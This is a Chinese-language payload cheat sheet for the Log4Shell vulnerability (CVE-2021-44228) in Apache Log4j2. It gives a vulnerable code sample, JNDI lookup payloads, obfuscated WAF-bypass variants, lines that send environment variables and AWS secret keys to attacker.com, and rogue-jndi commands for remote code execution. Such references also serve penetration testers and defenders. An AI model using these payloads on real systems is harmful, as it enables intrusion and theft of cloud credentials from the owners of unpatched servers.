[原文文档](Log4Shell.en.md)

# CVE-2021-44228 Log4Shell

> Apache Log4j2 <=2.14.1 JNDI 功能在配置、日志消息和参数中使用，不受对攻击者控制的LDAP和其他JNDI相关端点的保护。能够控制日志消息或日志消息参数的攻击者可以在启用消息查找替换时从LDAP服务器执行任意代码

## 概述

* [易受攻击的代码](#易受攻击的代码)
* [载荷](#载荷)
* [扫描](#扫描)
* [WAF 绕过](#waf-绕过)
* [利用](#利用)
    * [环境变量渗透](#环境变量渗透)
    * [远程命令执行](#远程命令执行)
* [参考资料](#参考资料)

## 易受攻击的代码

您可以使用以下命令在本地重现：`docker run --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app` 使用 [christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) 或 [leonjza/log4jpwn](https://github.com/leonjza/log4jpwn)

```java
public String index(@RequestHeader("X-Api-Version") String apiVersion) {
    logger.info("Received a request for API version " + apiVersion);
    return "Hello, world!";
}
```

## 载荷

```bash
# 识别Java版本和主机名
${jndi:ldap://${java:version}.domain/a}
${jndi:ldap://${env:JAVA_VERSION}.domain/a}
${jndi:ldap://${sys:java.version}.domain/a}
${jndi:ldap://${sys:java.vendor}.domain/a}
${jndi:ldap://${hostName}.domain/a}
${jndi:dns://${hostName}.domain}

# 更多枚举关键字和变量
java:os
docker:containerId
web:rootDir
bundle:config:db.password
```

## 扫描

* [log4j-scan](https://github.com/fullhunt/log4j-scan)

    ```powershell
    usage: log4j-scan.py [-h] [-u URL] [-l USEDLIST] [--request-type REQUEST_TYPE] [--headers-file HEADERS_FILE] [--run-all-tests] [--exclude-user-agent-fuzzing]
                        [--wait-time WAIT_TIME] [--waf-bypass] [--dns-callback-provider DNS_CALLBACK_PROVIDER] [--custom-dns-callback-host CUSTOM_DNS_CALLBACK_HOST]
    python3 log4j-scan.py -u http://127.0.0.1:8081 --run-all-test
    python3 log4j-scan.py -u http://127.0.0.1:808 --waf-bypass
    ```

* [Nuclei 模板](https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/cves/2021/CVE-2021-44228.yaml)

## WAF 绕过

```powershell
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/a}

# 使用小写和大写
${${lower:jndi}:${lower:rmi}://127.0.0.1:1389/poc}
${j${loWer:Nd}i${uPper::}://127.0.0.1:1389/poc}
${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}

# 使用环境变量创建字母
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//your.burpcollaborator.net/a}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}
```

## 利用

### 环境变量渗透

```powershell
${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/

# AWS 访问密钥
${jndi:ldap://${env:USER}.${env:USERNAME}.attacker.com:1389/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}
```

### 远程命令执行

* [rogue-jndi - @artsploit](https://github.com/artsploit/rogue-jndi)

    ```ps1
    java -jar target/RogueJndi-1.1.jar --command "touch /tmp/toto" --hostname "192.168.1.21"
    Mapping ldap://192.168.1.10:1389/ to artsploit.controllers.RemoteReference
    Mapping ldap://192.168.1.10:1389/o=reference to artsploit.controllers.RemoteReference
    Mapping ldap://192.168.1.10:1389/o=tomcat to artsploit.controllers.Tomcat
    Mapping ldap://192.168.1.10:1389/o=groovy to artsploit.controllers.Groovy
    Mapping ldap://192.168.1.10:1389/o=websphere1 to artsploit.controllers.WebSphere1
    Mapping ldap://192.168.1.10:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
    Mapping ldap://192.168.1.10:1389/o=websphere2 to artsploit.controllers.WebSphere2
    Mapping ldap://192.168.1.10:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
    ```

* [JNDI-Exploit-Kit - @pimps](https://github.com/pimps/JNDI-Exploit-Kit)

## 参考资料

* [Log4Shell：在流行的Java日志包log4j 2中发现RCE 0-day漏洞利用 - 2021年12月12日](https://www.lunasec.io/docs/blog/log4j-zero-day/)
* [Log4Shell更新：发布第二个log4j漏洞（CVE-2021-44228 + CVE-2021-45046）- 2021年12月14日](https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046/)
* [PSA：Log4Shell和JNDI注入的当前状态 - 2021年12月10日](https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/)